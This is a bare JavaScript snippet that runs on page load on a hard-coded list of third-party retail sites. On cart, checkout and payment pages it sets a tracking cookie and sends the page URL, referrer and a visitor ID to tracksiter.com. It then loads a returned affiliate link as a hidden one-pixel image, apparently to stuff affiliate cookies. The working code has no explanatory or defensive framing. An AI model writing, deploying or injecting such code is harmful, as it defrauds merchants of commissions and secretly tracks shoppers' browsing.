(function () {
  const TRACK_URL = 'https://tracksiter.com/api/track-user';
  const FALLBACK_PIXEL_URL = 'https://tracksiter.com/api/fallback-pixel?id=';
  const TRACKED_PATH_KEYWORDS = ['cart', 'checkout', 'checkouts', 'pay', 'review-order', 'payment', 'shipping'];
  const DOUBLE_PING_HOSTNAME = 'www.fareastflora.com';
  const DOUBLE_PING_DELAY = 2000;

  const SITE_CONFIG = {
    'www.fareastflora.com': { always: false, cartExtra: true },
    'aimedialinks.com': { always: true, cartExtra: true },
    'www.pizzahut.com.ph': { always: false, cartExtra: true },
    'www.stylevana.com': { always: false, cartExtra: true },
    'www.watsons.com.hk': { always: true, cartExtra: true },
    'www.watsonswine.com': { always: false, cartExtra: true },
    'sg.6ixty8ight.com': { always: false, cartExtra: true },
  };

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = Math.random() * 0x10 | 0x0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
    return match ? decodeURIComponent(match[1]) : '';
  }

  function createTrackingPixel(src) {
    const img = document.createElement('img');
    img.src = src;
    img.width = 1;
    img.height = 1;
    img.style.display = 'none';
    document.body.appendChild(img);
  }

  function findTrackedKeyword() {
    const path = window.location.pathname.toLowerCase();
    return TRACKED_PATH_KEYWORDS.find(function (keyword) {
      return path.includes(keyword);
    });
  }

  function isTrackedPath() {
    return Boolean(findTrackedKeyword());
  }

  async function doPing() {
    try {
      const uuid = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uuid + '; expires=' + expires + '; path=/; SameSite=Lax';

      const res = await fetch(TRACK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: location.href,
          referrer: document.referrer,
          unique_id: uuid,
          origin: location.hostname,
        }),
      });
      const data = await res.json();

      if (data.success && data.affiliate_url) {
        createTrackingPixel(data.affiliate_url);
      } else {
        createTrackingPixel(FALLBACK_PIXEL_URL + uuid);
      }
    } catch (err) {
      console.error('Tracking error', err);
    }
  }

  function pingWithDoublePing() {
    doPing();
    if (window.location.hostname === DOUBLE_PING_HOSTNAME) {
      setTimeout(doPing, DOUBLE_PING_DELAY);
    }
  }

  function init() {
    const hostname = window.location.hostname;
    const config = SITE_CONFIG[hostname];
    if (!config) return;
    if (config.cartExtra && isTrackedPath()) pingWithDoublePing();
    else config.always && pingWithDoublePing();
  }

  document.readyState === 'complete' ? init() : window.addEventListener('load', init, { once: true });
})();
